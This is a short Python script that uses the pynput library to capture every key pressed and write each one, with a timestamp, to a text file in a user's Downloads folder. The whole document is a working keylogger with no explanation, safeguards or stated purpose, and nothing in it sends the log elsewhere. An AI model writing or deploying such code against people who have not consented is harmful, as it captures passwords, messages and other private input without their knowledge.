from pynput.keyboard import Key, Listener
import logging

a = "C:/Users/manan/Downloads/Info.txt"


log_dir = ""
logging.basicConfig(filename=(log_dir + a), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()


